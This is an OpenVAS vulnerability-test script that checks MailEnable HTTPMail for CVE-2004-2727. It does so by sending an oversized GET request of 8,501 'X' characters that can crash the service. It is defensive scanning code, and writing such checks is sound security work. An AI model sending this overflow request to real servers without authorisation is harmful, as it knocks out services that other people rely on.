# OpenVAS Vulnerability Test
# $Id: mailenable_httpmail_get_overflow.nasl 5390 2017-02-21 18:39:27Z mime $
# Description: MailEnable HTTPMail Service GET Overflow Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The target is running at least one instance of MailEnable -
http://www.mailenable.com/ - that has a flaw in the HTTPMail service
(MEHTTPS.exe) in the Professional and Enterprise Editions.  The flaw
can be exploited by issuing an HTTP request exceeding 4045 bytes (8500
if logging is disabled), which causes a heap buffer overflow, crashing
the HTTPMail service and possibly allowing for arbitrary code
execution.";

tag_solution = "Upgrade to MailEnable Professional / Enterprise 1.19 or
later.";

if (description) {
  script_id(14656);
  script_version("$Revision: 5390 $");
  script_tag(name:"last_modification", value:"$Date: 2017-02-21 19:39:27 +0100 (Tue, 21 Feb 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2004-2727");
 script_bugtraq_id(10312);

  script_xref(name:"OSVDB", value:"6037");

  name = "MailEnable HTTPMail Service GET Overflow Vulnerability";
  script_name(name);
 
 
  summary = "Checks for GET Overflow Vulnerability in MailEnable HTTPMail Service";
  script_summary(summary);
 
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2004 George A. Theall");

  family = "Denial of Service";
  script_family(family);

  script_require_ports("Services/www", 8080, 80 );
  script_dependencies("global_settings.nasl", "gb_get_http_banner.nasl");
  script_mandatory_keys("MailEnable/banner");

  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");

host = get_host_name();
# nb: HTTPMail defaults to 8080 but can run on any port. 
port = 8080;
if (get_port_state(port)) soc = http_open_socket(port);
if (!soc) {
    port = get_http_port(default:80);
    if (get_port_state(port)) soc = http_open_socket(port);
}
if (!soc) {
  if (log_verbosity > 1) display("Can't determine port for MailEnable's HTTPMail service!\n");
  exit(1);
}
http_close_socket(soc);
if (debug_level) display("debug: searching for GET Overflow vulnerability in MailEnable HTTPMail Service on ", host, ":", port, ".\n");

# Make sure banner's from MailEnable.
banner = get_http_banner(port);
if (debug_level) display("debug: banner =>>", banner, "<<.\n");
if (!egrep(pattern:"^Server: .*MailEnable", string:banner)) exit(0);

# Try to bring it down.
if (safe_checks() == 0) {
  soc = http_open_socket(port);
  if (soc) {
    req = string(
      # assume logging is disabled.
      "GET /", crap(length:8501, data:"X"), " HTTP/1.0\r\n",
      "Host: ", get_host_name(), "\r\n",
      "\r\n"
    );
    if (debug_level) display("debug: sending =>>", req, "<<\n");
    send(socket:soc, data:req);
    res = http_recv(socket:soc);
    http_close_socket(soc);
    if (res) {
      if (debug_level) display("debug: res =>>", res, "<<\n");
    }
    else {
     soc = http_open_socket(port);
     if (!soc)
       security_message(port);
     else
       http_close_socket(soc);

    }
  }
}
